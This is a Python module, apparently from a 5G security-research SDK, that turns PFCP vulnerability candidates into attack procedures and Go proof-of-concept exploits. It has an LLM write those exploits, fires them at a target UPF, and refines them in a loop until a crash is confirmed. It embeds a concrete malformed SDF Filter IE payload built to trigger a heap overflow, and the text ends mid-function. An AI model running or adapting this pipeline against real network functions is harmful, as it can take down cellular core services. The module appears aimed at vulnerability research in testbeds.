from __future__ import annotations

import json
import re
import shutil
import subprocess
import time
import logging
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable

from ifinder_sdk.config import (
    AttackManipulation,
    AttackSequenceStep,
    AttackVector,
    AttackVectorDocument,
    ExpectedOutcome,
    ExploitationResult,
    ExploitationVerdict,
    ProtocolMessageSpec,
    ProtocolType,
    TriggerEvidence,
    TriggerLocation,
    iTrueCandidate,
)


MessageSchemaMap = dict[str, dict[str, Any]]
ExecuteOnceFn = Callable[[Path, AttackVectorDocument, int], dict[str, Any]]

_PFCP_MESSAGE_TYPE_HINTS = {
    "PFCP_Heartbeat_Request": 1,
    "PFCP_Heartbeat_Response": 2,
    "PFCP_PFD_Management_Request": 3,
    "PFCP_PFD_Management_Response": 4,
    "PFCP_Session_Establishment_Request": 50,
    "PFCP_Session_Establishment_Response": 51,
    "PFCP_Session_Modification_Request": 52,
    "PFCP_Session_Modification_Response": 53,
    "PFCP_Session_Deletion_Request": 54,
    "PFCP_Session_Deletion_Response": 55,
    "PFCP_Session_Report_Request": 56,
    "PFCP_Session_Report_Response": 57,
    "PFCP_Session_Set_Deletion_Request": 58,
    "PFCP_Session_Set_Deletion_Response": 59,
    "PFCP_Association_Setup_Request": 5,
    "PFCP_Association_Setup_Response": 6,
    "PFCP_Association_Update_Request": 7,
    "PFCP_Association_Update_Response": 8,
    "PFCP_Association_Release_Request": 9,
    "PFCP_Association_Release_Response": 10,
    "PFCP_Version_Not_Supported_Response": 11,
    "PFCP_Node_Report_Request": 12,
    "PFCP_Node_Report_Response": 13,
}

_CRASH_KEYWORDS = [
    "asan",
    "heap-buffer-overflow",
    "segmentation fault",
    "segfault",
    "assertion",
    "panic",
    "fatal",
    "nil pointer",
    "core dumped",
    "out of bounds",
]

_DIAGNOSIS_RULES: list[tuple[str, str, str]] = [
    ("unknown teid", "TEID mismatch", "extract_teid_from_prior_message"),
    ("invalid sequence", "Sequence mismatch", "match_sequence_with_request"),
    ("missing mandatory ie", "Mandatory IE missing", "add_missing_mandatory_ie"),
    ("association not found", "PFCP association missing", "establish_association_first"),
    ("session not found", "Session context missing", "establish_session_first"),
]

_FEW_SHOT_ATTACK_PROCEDURE = r"""{
  "steps": [
    {"step": 1, "role": "attacker", "message": "PFCP_Association_Setup_Request", "purpose": "Establish PFCP association with the target UPF", "details": "Send standard Association Setup with valid NodeID and RecoveryTimeStamp", "triggers_vulnerability": false},
    {"step": 2, "role": "target", "message": "PFCP_Association_Setup_Response", "purpose": "Target acknowledges association", "details": "Wait for response to confirm association is established", "triggers_vulnerability": false},
    {"step": 3, "role": "attacker", "message": "PFCP_Session_Establishment_Request", "purpose": "Trigger vulnerability via malformed SDF Filter IE", "details": "Include CreatePDR with PDI containing an SDF Filter IE whose flow_description_len is set to 200 (exceeding the actual description length), causing OOB read in ogs_pfcp_parse_sdf_filter", "triggers_vulnerability": true}
  ],
  "malformed_ie_construction": {
    "ie_type": "SDF Filter",
    "ie_type_value": 23,
    "malformed_fields": {
      "flow_description_len": {"normal_range": "0-255 matching actual string length", "malicious_value": 200, "encoding": "uint16 big-endian at offset 0 of SDF Filter IE value"}
    },
    "exploit_mechanism": "The parser reads flow_description_len bytes from the IE payload but the actual IE data is shorter, causing a heap-buffer-overflow in ogs_pfcp_parse_sdf_filter",
    "raw_bytes_hint": "IE Type=0x0017, Length=0x0006, Flags=0x04, FD_Len=0x00C8(200), FD='A'"
  },
  "required_sibling_ies": [
    {"ie_name": "NodeID", "ie_type": 60, "value": "Attacker IPv4 address"},
    {"ie_name": "CPFSEID", "ie_type": 57, "value": "Control Plane F-SEID with attacker IP and SEID=1"},
    {"ie_name": "CreatePDR", "ie_type": 1, "value": "PDR containing PDI with SDF Filter"}
  ],
  "success_criteria": "The target UPF process crashes with heap-buffer-overflow in ogs_pfcp_parse_sdf_filter at types.c:346",
  "expected_crash": {"type": "heap_buffer_overflow", "function": "ogs_pfcp_parse_sdf_filter", "file": "lib/pfcp/types.c", "line": 346}
}"""

logger = logging.getLogger(__name__)


def _load_trigger_message_schema(
    trigger_message: str,
    protocol: ProtocolType = ProtocolType.PFCP,
) -> dict[str, Any] | None:
    """Load raw message schema JSON from protocol/pfcp/raw/Message/{name}.json."""
    if protocol != ProtocolType.PFCP:
        return None

    # Convert "PFCP_Session_Establishment_Request" → "SessionEstablishmentRequest"
    name = trigger_message
    if name.startswith("PFCP_"):
        name = name[5:]
    name = name.replace("_", "")

    search_paths = [
        Path(__file__).resolve().parents[4] / "protocol" / "pfcp" / "raw" / "Message" / f"{name}.json",
        Path.cwd() / "protocol" / "pfcp" / "raw" / "Message" / f"{name}.json",
    ]

    for path in search_paths:
        if path.exists():
            try:
                with open(path, encoding="utf-8") as fp:
                    return json.load(fp)
            except (json.JSONDecodeError, OSError) as exc:
                logger.warning("Failed to load trigger message schema %s: %s", path, exc)
                return None

    logger.debug("No raw schema found for trigger message %s", trigger_message)
    return None


def load_message_schemas(message_schemas: dict[str, Any] | str | Path | None) -> MessageSchemaMap:
    if message_schemas is None:
        return {}
    if isinstance(message_schemas, dict):
        return _normalize_schema_map(message_schemas)

    path = Path(message_schemas)
    if not path.exists():
        raise FileNotFoundError(f"Message schema file not found: {path}")
    with open(path, encoding="utf-8") as fp:
        data = json.load(fp)
    return _normalize_schema_map(data)


def derive_attack_vector_and_messages(
    candidate: iTrueCandidate | dict[str, Any],
    *,
    message_schemas: dict[str, Any] | str | Path | None = None,
    prerequisite_messages: list[str] | None = None,
    protocol: ProtocolType = ProtocolType.PFCP,
) -> AttackVectorDocument:
    cand = _normalize_candidate(candidate)
    schema_map = load_message_schemas(message_schemas)

    trigger_message = _normalize_message_name(cand.trigger_message, protocol)
    prior_messages = list(dict.fromkeys(prerequisite_messages or []))
    target_entity = _infer_target_entity(cand)
    target_interface = "N4" if protocol == ProtocolType.PFCP else "S11/S5c"
    attacker_role = _infer_attacker_role(target_entity)

    expected_buffer_size = _infer_expected_buffer_size(cand)
    malicious_value = _infer_malicious_value(cand, expected_buffer_size)
    expected_outcome = _infer_expected_outcome(cand)

    steps: list[dict[str, Any]] = []
    step_no = 1
    for msg in prior_messages:
        action = "respond" if msg.endswith("Response") else "send"
        steps.append(
            {
                "step": step_no,
                "message": msg,
                "manipulation": {
                    "ie": cand.trigger_ie or "UnknownIE",
                    "field": cand.ie_field or "unknown_field",
                    "malicious_value": "<benign_placeholder>",
                },
                "triggers_vulnerability": False,
                "action": action,
            }
        )
        step_no += 1

    action = "respond" if trigger_message.endswith("Response") else "send"
    steps.append(
        {
            "step": step_no,
            "message": trigger_message,
            "manipulation": {
                "ie": cand.trigger_ie or "UnknownIE",
                "field": cand.ie_field or "unknown_field",
                "malicious_value": malicious_value,
                "expected_buffer_size": expected_buffer_size,
            },
            "triggers_vulnerability": True,
            "action": action,
        }
    )

    protocol_messages: dict[str, dict[str, Any]] = {}
    for msg in prior_messages + [trigger_message]:
        mandatory_ies = _extract_mandatory_ies(schema_map, msg)
        is_trigger = msg == trigger_message
        protocol_messages[msg] = _build_protocol_message_spec(
            message_name=msg,
            mandatory_ies=mandatory_ies,
            trigger_ie=cand.trigger_ie,
            ie_field=cand.ie_field,
            malicious_value=malicious_value if is_trigger else "<benign_placeholder>",
            include_attack_payload=is_trigger,
        )

    attack_doc = AttackVectorDocument(
        candidate_id=cand.id,
        attack_vector={
            "target_entity": target_entity,
            "target_interface": target_interface,
            "attacker_role": attacker_role,
            "attack_sequence": steps,
            "expected_outcome": expected_outcome,
        },
        protocol_messages=protocol_messages,
    )
    return attack_doc


def generate_poc_from_attack_vector(
    attack_doc: AttackVectorDocument | dict[str, Any],
    output_root: str | Path,
    *,
    candidate: iTrueCandidate | dict[str, Any] | None = None,
    pattern_id: str | None = None,
    target_version: str | None = None,
    target_software: str | None = None,
) -> Path:
    doc = _normalize_attack_doc(attack_doc)
    cand = _normalize_candidate(candidate) if candidate is not None else None
    output_root_path = Path(output_root)
    poc_dir = output_root_path / doc.candidate_id
    poc_dir.mkdir(parents=True, exist_ok=True)

    attack_path = poc_dir / "attack_vector.json"
    attack_payload = json.dumps(doc.model_dump(), indent=2) + "\n"
    attack_path.write_text(attack_payload, encoding="utf-8")

    raw_hex = _extract_raw_hex_from_attack_doc(doc)

    attack_procedure = _build_attack_procedure_doc(
        doc=doc,
        candidate=cand,
        pattern_id=pattern_id,
        target_version=target_version,
        target_software=target_software,
        raw_hex=raw_hex,
    )
    if attack_procedure:
        (poc_dir / "attack_vector.json").write_text(
            json.dumps(attack_procedure, indent=2) + "\n", encoding="utf-8"
        )

    go_mod = f"""module poc/{doc.candidate_id}

go 1.21

require github.com/wmnsk/go-pfcp v0.0.24
"""
    (poc_dir / "go.mod").write_text(go_mod, encoding="utf-8")

    runtime_path = (
        Path(__file__).resolve().parent.parent / "assets" / "poc" / "pfcp_runtime.go"
    )
    if runtime_path.exists():
        main_go = runtime_path.read_text(encoding="utf-8")
    else:
        trigger_message = _get_trigger_message(doc)
        main_go = f'''package main

import (
    "encoding/json"
    "fmt"
    "os"
)

func main() {{
    raw, err := os.ReadFile("attack_vector.json")
    if err != nil {{
        fmt.Println("failed to read attack_vector.json:", err)
        os.Exit(1)
    }}

    var payload map[string]any
    if err := json.Unmarshal(raw, &payload); err != nil {{
        fmt.Println("failed to parse attack_vector.json:", err)
        os.Exit(1)
    }}

    fmt.Println("Loaded attack vector for candidate: {doc.candidate_id}")
    fmt.Println("Trigger message: {trigger_message}")
    fmt.Println("PoC scaffold generated. Implement protocol send path here.")
}}
'''
    (poc_dir / "main.go").write_text(main_go, encoding="utf-8")

    readme = f"""# PoC for {doc.candidate_id}

This PoC was generated from `attack_vector.json`.

## Files
- `main.go`: PoC scaffold entrypoint
- `go.mod`: module definition
- `attack_vector.json`: attack vector and protocol messages

## Build
```bash
go build -o poc_binary .
```

## Run
Client mode (send requests):
```bash
./poc_binary -target <PFCP_IP> -local <LOCAL_IP> -seid <SEID> -timeout <SECONDS>
```

Server mode (respond with responses):
```bash
./poc_binary -listen <LISTEN_IP> -local <LOCAL_IP> -seid <SEID> -timeout <SECONDS>
```
"""
    (poc_dir / "README.md").write_text(readme, encoding="utf-8")

    return poc_dir


def run_pre_execution_checks(
    poc_dir: str | Path,
    attack_doc: AttackVectorDocument | dict[str, Any],
) -> dict[str, Any]:
    base = Path(poc_dir)

    required_files = ["main.go", "go.mod", "attack_vector.json"]
    missing = [name for name in required_files if not (base / name).exists()]
    files_ok = not missing

    equivalence_ok, equivalence_issues = _check_poc_equivalence(base)
    compile_ok, compile_stdout, compile_stderr = _run_go_build(base)

    issues = []
    if missing:
        issues.append(f"Missing required files: {', '.join(missing)}")
    issues.extend(equivalence_issues)
    if not compile_ok:
        issues.append("Go compilation failed or Go toolchain unavailable.")

    return {
        "files_ok": files_ok,
        "equivalence_ok": equivalence_ok,
        "compile_ok": compile_ok,
        "compile_stdout": compile_stdout,
        "compile_stderr": compile_stderr,
        "overall_ok": files_ok and equivalence_ok and compile_ok,
        "issues": issues,
    }


def feedback_aware_refinement_loop(
    attack_doc: AttackVectorDocument | dict[str, Any],
    *,
    poc_dir: str | Path,
    execute_once: ExecuteOnceFn,
    max_iterations: int = 5,
    expected_file: str | None = None,
    expected_function: str | None = None,
) -> ExploitationResult:
    current_doc = _normalize_attack_doc(attack_doc)
    base = Path(poc_dir)
    refinements: list[str] = []

    for attempt in range(1, max_iterations + 1):
        exec_result = execute_once(base, current_doc, attempt)
        logs = str(exec_result.get("logs", ""))
        analysis = analyze_runtime_logs(logs, attack_context=current_doc)

        if analysis is None:
            analysis = {"triggered": False, "diagnosis": "LLM log analysis unavailable."}

        if analysis["triggered"]:
            location = analysis.get("trigger_location") or {}
            matched = _is_expected_trigger(
                location=location,
                expected_file=expected_file,
                expected_function=expected_function,
            )
            verdict = (
                ExploitationVerdict.CONFIRMED
                if matched
                else ExploitationVerdict.TRIGGERED_DIFFERENT
            )
            trigger_location = TriggerLocation(
                file=str(location.get("file", "unknown")),
                line=int(location.get("line", 0)),
                function=str(location.get("function", "unknown")),
            )
            trigger_evidence = TriggerEvidence(
                type=str(analysis.get("trigger_type", "unknown")),
                location=trigger_location,
                log_snippet=analysis.get("log_snippet", []),
            )
            return ExploitationResult(
                candidate_id=current_doc.candidate_id,
                validation_result=verdict,
                timestamp=datetime.now(timezone.utc),
                attempts=attempt,
                trigger_evidence=trigger_evidence,
                poc_path=str(base / "main.go"),
                refinements_attempted=refinements or None,
            )

        if attempt == max_iterations:
            diagnosis = analysis.get("diagnosis") or str(exec_result.get("error") or "No crash observed.")
            return ExploitationResult(
                candidate_id=current_doc.candidate_id,
                validation_result=ExploitationVerdict.UNCONFIRMED,
                timestamp=datetime.now(timezone.utc),
                attempts=attempt,
                poc_path=str(base / "main.go"),
                failure_analysis=diagnosis,
                refinements_attempted=refinements or None,
            )

        # LLM-driven refinement: let LLM read logs + current main.go and fix the code
        action = _llm_refine_poc(base, current_doc, analysis, logs)
        refinements.append(action)

    return ExploitationResult(
        candidate_id=current_doc.candidate_id,
        validation_result=ExploitationVerdict.UNCONFIRMED,
        timestamp=datetime.now(timezone.utc),
        attempts=max_iterations,
        poc_path=str(base / "main.go"),
        failure_analysis="Execution loop ended without result.",
        refinements_attempted=refinements or None,
    )


def analyze_runtime_logs(
    logs: str,
    attack_context: AttackVectorDocument | dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Analyze runtime logs via LLM to determine whether the vulnerability
    was triggered (crash, session hijacking, state corruption, etc.)."""
    return _llm_log_analysis(logs, attack_context)


_VALID_REFINEMENT_ACTIONS = frozenset({
    "extract_teid_from_prior_message",
    "match_sequence_with_request",
    "add_missing_mandatory_ie",
    "establish_association_first",
    "establish_session_first",
    "none",
})


def _llm_log_analysis(
    logs: str,
    attack_context: AttackVectorDocument | dict[str, Any] | None = None,
) -> dict[str, Any] | None:
    """Use Claude CLI to analyze runtime logs and judge whether the
    vulnerability was triggered (crash, session hijacking, state corruption,
    etc.).  The last 50 lines of the log are passed directly in the prompt."""
    claude_cmd = shutil.which("claude")
    if claude_cmd is None:
        return None

    last_50 = "\n".join(logs.splitlines()[-50:])

    context_block = ""
    if attack_context is not None:
        doc = (
            attack_context
            if isinstance(attack_context, AttackVectorDocument)
            else _normalize_attack_doc(attack_context)
        )
        outcome = doc.attack_vector.expected_outcome
        context_block = (
            "\n## Attack Context\n"
            f"- Candidate ID: {doc.candidate_id}\n"
            f"- Target Entity: {doc.attack_vector.target_entity}\n"
            f"- Target Interface: {doc.attack_vector.target_interface}\n"
            f"- Attacker Role: {doc.attack_vector.attacker_role}\n"
            f"- Expected Outcome Type: {outcome.type}\n"
            f"- Expected Outcome Impact: {outcome.impact}\n"
            f"- Expected Outcome Location: {outcome.location}\n"
        )

    prompt = (
        "You are a cellular core-network security analyst. "
        "Analyze the following runtime logs (last 50 lines) from a PoC execution "
        "and determine whether the target vulnerability was successfully triggered.\n\n"
        "A successful trigger includes crashes (segfault, assertion, panic, "
        "buffer overflow, etc.) AND non-crash impacts such as session hijacking, "
        "traffic redirection, state corruption, or resource exhaustion.\n"
        f"{context_block}\n"
        f"## Runtime Logs (last 50 lines)\n```\n{last_50}\n```\n\n"
        "Respond in EXACTLY this format (one value per line):\n"
        "TRIGGERED: YES or NO\n"
        "IMPACT_TYPE: one of [crash, session_hijacking, traffic_redirect, "
        "state_corruption, dos, resource_exhaustion, none]\n"
        "CRASH_TYPE: one of [heap_buffer_overflow, assertion_failure, panic, "
        "segfault, fatal, nil_pointer, unknown_crash, none]\n"
        "LOCATION_FILE: source file where the impact occurred, or unknown\n"
        "LOCATION_LINE: integer line number, or 0\n"
        "LOCATION_FUNCTION: function name, or unknown\n"
        "DIAGNOSIS: one-sentence diagnosis\n"
        "REFINEMENT: one of [extract_teid_from_prior_message, "
        "match_sequence_with_request, add_missing_mandatory_ie, "
        "establish_association_first, establish_session_first, none]\n"
        "MISSING_IE: IE name if a mandatory IE is missing, or none\n"
    )

    env = dict(subprocess.os.environ)
    env.pop("CLAUDECODE", None)

    try:
        proc = subprocess.run(
            [claude_cmd, "-p", "--model", "claude-opus-4-6", "--no-session-persistence"],
            input=prompt,
            capture_output=True,
            text=True,
            timeout=120,
            env=env,
            check=False,
        )
    except Exception:  # noqa: BLE001
        return None

    if proc.returncode != 0:
        logging.getLogger(__name__).warning(
            "LLM log analysis failed (exit %d): %s", proc.returncode, proc.stderr[:200],
        )
        return None

    return _parse_log_analysis_response(proc.stdout, logs)


def _parse_log_analysis_response(response: str, logs: str) -> dict[str, Any] | None:
    """Parse the structured response from the LLM log analysis."""
    fields: dict[str, str] = {}
    for line in response.strip().splitlines():
        stripped = line.strip()
        for key in (
            "TRIGGERED", "IMPACT_TYPE", "CRASH_TYPE",
            "LOCATION_FILE", "LOCATION_LINE", "LOCATION_FUNCTION",
            "DIAGNOSIS", "REFINEMENT", "MISSING_IE",
        ):
            if stripped.upper().startswith(key + ":"):
                fields[key] = stripped.split(":", 1)[1].strip()
                break

    if "TRIGGERED" not in fields:
        return None

    triggered = fields["TRIGGERED"].upper() == "YES"
    impact_type = fields.get("IMPACT_TYPE", "none").lower()
    trigger_type_raw = fields.get("CRASH_TYPE", "none").lower()
    trigger_type = trigger_type_raw if trigger_type_raw != "none" else (
        impact_type if triggered else None
    )

    loc_file = fields.get("LOCATION_FILE", "unknown")
    try:
        loc_line = int(fields.get("LOCATION_LINE", "0"))
    except ValueError:
        loc_line = 0
    loc_func = fields.get("LOCATION_FUNCTION", "unknown")

    diagnosis = fields.get("DIAGNOSIS", "No diagnosis provided by LLM.")
    refinement = fields.get("REFINEMENT", "none").strip()
    if refinement not in _VALID_REFINEMENT_ACTIONS:
        refinement = "none"

    missing_ie_raw = fields.get("MISSING_IE", "none").strip()
    missing_ie = None if missing_ie_raw.lower() == "none" else missing_ie_raw

    snippet = _extract_log_snippet(logs)

    return {
        "triggered": triggered,
        "trigger_type": trigger_type,
        "trigger_location": {
            "file": loc_file,
            "line": loc_line,
            "function": loc_func,
        } if triggered else None,
        "diagnosis": diagnosis,
        "refinement_action": refinement,
        "missing_ie": missing_ie,
        "log_snippet": snippet,
    }


def apply_feedback_refinement(
    attack_doc: AttackVectorDocument | dict[str, Any],
    analysis: dict[str, Any],
) -> tuple[AttackVectorDocument, str]:
    doc = _normalize_attack_doc(attack_doc)
    action = str(analysis.get("refinement_action", "none"))

    data = doc.model_dump()
    trigger_msg = _get_trigger_message(doc)
    trigger_spec = data["protocol_messages"].setdefault(trigger_msg, {"header": {}, "ies": {}})
    trigger_header = trigger_spec.setdefault("header", {})
    trigger_ies = trigger_spec.setdefault("ies", {})

    if action == "extract_teid_from_prior_message":
        trigger_header["teid"] = "<extract_from_prior_message>"
        return AttackVectorDocument.model_validate(data), "Set trigger TEID to dynamic extraction placeholder."

    if action == "match_sequence_with_request":
        trigger_header["sequence_number"] = "<match_request_sequence>"
        return AttackVectorDocument.model_validate(data), "Set sequence number to match request transaction."

    if action == "add_missing_mandatory_ie":
        missing_ie = analysis.get("missing_ie") or "UnknownMandatoryIE"
        trigger_ies.setdefault(str(missing_ie), {"value": "<placeholder>"})
        return AttackVectorDocument.model_validate(data), f"Added missing mandatory IE placeholder: {missing_ie}."

    if action == "establish_association_first":
        _prepend_messages_if_missing(
            data,
            [
                "PFCP_Association_Setup_Request",
                "PFCP_Association_Setup_Response",
            ],
        )
        return AttackVectorDocument.model_validate(data), "Prepended association setup messages."

    if action == "establish_session_first":
        _prepend_messages_if_missing(
            data,
            [
                "PFCP_Session_Establishment_Request",
                "PFCP_Session_Establishment_Response",
            ],
        )
        return AttackVectorDocument.model_validate(data), "Prepended session establishment messages."

    return doc, "No refinement rule matched."


def execute_in_docker_testbed_once(
    poc_dir: Path,
    attack_doc: AttackVectorDocument,
    attempt: int,
    *,
    docker_container: str,
    target_port: int = 8805,
    wait_seconds: float = 2.0,
) -> dict[str, Any]:
    if shutil.which("docker") is None:
        return {"status": "error", "error": "docker command not found", "logs": ""}

    binary = poc_dir / "poc_binary"
    if not binary.exists():
        return {"status": "error", "error": f"missing binary: {binary}", "logs": ""}

    restart = subprocess.run(
        ["docker", "restart", docker_container],
        capture_output=True,
        text=True,
        check=False,
    )
    if restart.returncode != 0:
        return {
            "status": "error",
            "error": f"failed to restart container {docker_container}",
            "logs": restart.stdout + restart.stderr,
        }

    inspect = subprocess.run(
        [
            "docker",
            "inspect",
            docker_container,
            "--format",
            "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    target_ip = inspect.stdout.strip()
    if inspect.returncode != 0 or not target_ip:
        return {
            "status": "error",
            "error": f"failed to inspect container ip for {docker_container}",
            "logs": inspect.stdout + inspect.stderr,
        }

    run = subprocess.run(
        [str(binary), "-target", f"{target_ip}:{target_port}"],
        cwd=str(poc_dir),
        capture_output=True,
        text=True,
        check=False,
    )
    time.sleep(wait_seconds)

    logs = subprocess.run(
        ["docker", "logs", docker_container, "--tail", "200"],
        capture_output=True,
        text=True,
        check=False,
    )
    combined_logs = "\n".join(
        [
            f"attempt={attempt}",
            run.stdout,
            run.stderr,
            logs.stdout,
            logs.stderr,
        ]
    )
    return {"status": "ok", "logs": combined_logs}


def execute_local_poc_once(
    poc_dir: Path,
    attack_doc: AttackVectorDocument,
    attempt: int,
    *,
    target_ip: str | None,
    listen_ip: str | None = None,
    local_ip: str | None = None,
    seid: int | None = None,
    timeout: int | None = None,
) -> dict[str, Any]:
    binary = poc_dir / "poc_binary"
    if not binary.exists():
        return {"status": "error", "error": f"missing binary: {binary}", "logs": ""}

    args = [str(binary)]
    if listen_ip:
        args += ["-listen", listen_ip]
    elif target_ip:
        args += ["-target", target_ip]
    if local_ip:
        args += ["-local", local_ip]
    if seid is not None:
        args += ["-seid", str(seid)]
    if timeout is not None:
        args += ["-timeout", str(timeout)]

    run = subprocess.run(
        args,
        cwd=str(poc_dir),
        capture_output=True,
        text=True,
        check=False,
    )
    combined_logs = "\n".join(
        [
            f"attempt={attempt}",
            run.stdout,
            run.stderr,
        ]
    )
    return {"status": "ok", "logs": combined_logs}


def _llm_derive_attack_procedure(
    candidate: iTrueCandidate,
    *,
    prerequisite_messages: list[str] | None = None,
    protocol: ProtocolType = ProtocolType.PFCP,
    poc_dir: Path,
    pattern_id: str | None = None,
    target_version: str | None = None,
    target_software: str | None = None,
) -> tuple[dict[str, Any], AttackVectorDocument]:
    """Use LLM to derive a detailed attack procedure from vulnerability context.

    Returns ``(attack_procedure_dict, AttackVectorDocument)`` so downstream
    pre-checks and the refinement loop can work with the standard model.
    Falls back to the deterministic heuristic when the ``claude`` CLI is
    unavailable or the LLM call fails.
    """
    trigger_msg = _normalize_message_name(candidate.trigger_message, protocol)
    raw_schema = _load_trigger_message_schema(trigger_msg, protocol)
    prereqs = list(dict.fromkeys(prerequisite_messages or []))

    schema_block = ""
    if raw_schema:
        schema_block = (
            "\n## Trigger Message Raw Schema\n"
            f"```json\n{json.dumps(raw_schema, indent=2)}\n```\n"
        )

    prereq_block = "\n".join(f"- {msg}" for msg in prereqs) if prereqs else "None"

    prompt = (
        "You are a 5G core network security researcher. Given the following "
        "vulnerability candidate information, derive a detailed attack procedure.\n\n"
        f"## Vulnerability Candidate\n"
        f"- **ID**: {candidate.id}\n"
        f"- **Vulnerable Site**: {candidate.vulnerable_site.file}:{candidate.vulnerable_site.line} "
        f"in function `{candidate.vulnerable_site.function}`\n"
        f"- **Dangerous Operation**: {candidate.vulnerable_site.dangerous_operation}\n"
        f"- **Trigger Message**: {trigger_msg}\n"
        f"- **Trigger IE**: {candidate.trigger_ie}\n"
        f"- **IE Field**: {candidate.ie_field}\n"
        f"- **Data Flow**: {candidate.data_flow}\n"
        f"- **Call Chain**: {' -> '.join(candidate.call_chain) if candidate.call_chain else 'N/A'}\n\n"
        f"## Prerequisite Messages (from vetting)\n{prereq_block}\n"
        f"{schema_block}\n"
        f"## Reference Example\n"
        f"Here is a condensed example of a well-formed attack procedure for a "
        f"similar PFCP vulnerability:\n```json\n{_FEW_SHOT_ATTACK_PROCEDURE}\n```\n\n"
        "## Instructions\n"
        "Based on the vulnerability context above, generate an attack procedure JSON. "
        "You must output **pure JSON only** (no markdown fences, no explanation). "
        "The JSON must have exactly these top-level keys:\n\n"
        "1. **steps**: Array of message steps. Each step has:\n"
        "   - `step` (int): step number\n"
        "   - `role` (string): \"attacker\" or \"target\"\n"
        "   - `message` (string): PFCP message name (e.g., \"PFCP_Association_Setup_Request\")\n"
        "   - `purpose` (string): why this step is needed\n"
        "   - `details` (string): specific details about what to send/expect\n"
        "   - `triggers_vulnerability` (bool): true only for the step that triggers the bug\n\n"
        "2. **malformed_ie_construction**: Object describing how to construct the malicious IE:\n"
        "   - `ie_type` (string): IE name\n"
        "   - `ie_type_value` (int): PFCP IE type number\n"
        "   - `malformed_fields` (object): field name -> {normal_range, malicious_value, encoding}\n"
        "   - `exploit_mechanism` (string): how the malformed IE triggers the vulnerability\n"
        "   - `raw_bytes_hint` (string): hex or byte-level description of the malformed IE\n\n"
        "3. **required_sibling_ies**: Array of other IEs the trigger message must carry:\n"
        "   - `ie_name` (string)\n"
        "   - `ie_type` (int)\n"
        "   - `value` (string): description of the value to use\n\n"
        "4. **success_criteria** (string): What constitutes a successful exploit\n\n"
        "5. **expected_crash**: Object with:\n"
        "   - `type` (string): e.g., \"heap_buffer_overflow\", \"assertion_failure\"\n"
        "   - `function` (string)\n"
        "   - `file` (string)\n"
        "   - `line` (int)\n\n"
        "Output ONLY valid JSON. No markdown, no explanation."
    )

    claude_cmd = shutil.which("claude")
    if claude_cmd is None:
        raise RuntimeError("claude CLI not found in PATH")

    env = dict(subprocess.os.environ)
    env.pop("CLAUDECODE", None)

    try:
        proc = subprocess.run(
            [claude_cmd, "-p", "--model", "claude-opus-4-6", "--no-session-persistence"],
            input=prompt,
            capture_output=True,
            text=True,
            timeout=300,
            env=env,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        raise RuntimeError("LLM attack procedure derivation timed out (600s)") from exc

    if proc.returncode != 0:
        raise RuntimeError(
            f"LLM attack procedure derivation failed (exit {proc.returncode}): {proc.stderr[:300]}"
        )

    # Parse LLM output — strip markdown fences if present
    raw_output = proc.stdout.strip()
    json_match = re.search(r"```(?:json)?\s*\n(.*?)\n```", raw_output, re.DOTALL)
    if json_match:
        raw_output = json_match.group(1)

    try:
        attack_procedure = json.loads(raw_output)
    except json.JSONDecodeError as exc:
        raise RuntimeError(
            f"LLM output is not valid JSON: {raw_output[:500]}"
        ) from exc

    # Wrap in full document structure
    full_procedure: dict[str, Any] = {
        "vuln_id": candidate.id,
        "pattern_id": pattern_id or "UNKNOWN",
        "target_software": target_software or "UnknownTarget",
        "target_version": target_version or "unknown",
        "attack_procedure": attack_procedure,
    }

    poc_dir.mkdir(parents=True, exist_ok=True)
    (poc_dir / "attack_vector.json").write_text(
        json.dumps(full_procedure, indent=2) + "\n", encoding="utf-8",
    )

    # Build an AttackVectorDocument for downstream compatibility (in-memory only)
    attack_doc = _attack_procedure_to_attack_doc(candidate, attack_procedure, protocol)

    return full_procedure, attack_doc


def _llm_generate_poc(
    attack_vector: dict[str, Any],
    *,
    candidate: iTrueCandidate,
    poc_dir: Path,
) -> Path:
    """Use LLM to generate a Go PoC from the attack vector."""
    vector_json = json.dumps(attack_vector, indent=2)

    prompt = (
        "You are a cellular core network security researcher writing a Proof-of-Concept exploit in Go.\n\n"
        "Based on the following attack vector, write a complete PoC in Go using "
        "the `github.com/wmnsk/go-pfcp` library. Output ONLY Go source code.\n\n"
        f"## attack_vector.json\n```json\n{vector_json}\n```\n"
    )

    claude_cmd = shutil.which("claude")
    if claude_cmd is None:
        raise RuntimeError("claude CLI not found in PATH")

    env = dict(subprocess.os.environ)
    env.pop("CLAUDECODE", None)

    try:
        proc = subprocess.run(
            [claude_cmd, "-p", "--model", "claude-opus-4-6", "--no-session-persistence"],
            input=prompt,
            capture_output=True,
            text=True,
            timeout=300,
            env=env,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        raise RuntimeError("LLM PoC generation timed out (600s)") from exc

    if proc.returncode != 0:
        raise RuntimeError(
            f"LLM PoC generation failed (exit {proc.returncode}): {proc.stderr[:300]}"
        )

    raw_output = proc.stdout.strip()
    # Strip markdown fences if present
    go_match = re.search(r"```(?:go)?\s*\n(.*?)\n```", raw_output, re.DOTALL)
    if go_match:
        raw_output = go_match.group(1)

    # Validate it looks like Go code
    if not raw_output.lstrip().startswith("package"):
        pkg_idx = raw_output.find("package main")
        if pkg_idx >= 0:
            raw_output = raw_output[pkg_idx:]
        else:
            raise RuntimeError(
                f"LLM output doesn't look like Go code: {raw_output[:300]}"
            )

    poc_dir.mkdir(parents=True, exist_ok=True)
    (poc_dir / "main.go").write_text(raw_output + "\n", encoding="utf-8")

    go_mod = (
        f"module poc/{candidate.id}\n\n"
        "go 1.21\n\n"
        "require github.com/wmnsk/go-pfcp v0.0.24\n"
    )
    (poc_dir / "go.mod").write_text(go_mod, encoding="utf-8")

    return poc_dir


def _attack_procedure_to_attack_doc(
    candidate: iTrueCandidate,
    attack_procedure: dict[str, Any],
    protocol: ProtocolType,
) -> AttackVectorDocument:
    """Convert LLM-generated attack procedure dict to an ``AttackVectorDocument``."""
    steps = attack_procedure.get("steps", [])
    malformed = attack_procedure.get("malformed_ie_construction", {})
    expected = attack_procedure.get("expected_crash", {})

    target_entity = _infer_target_entity(candidate)
    target_interface = "N4" if protocol == ProtocolType.PFCP else "S11/S5c"
    attacker_role = _infer_attacker_role(target_entity)

    attack_sequence: list[AttackSequenceStep] = []
    for step_data in steps:
        is_trigger = step_data.get("triggers_vulnerability", False)
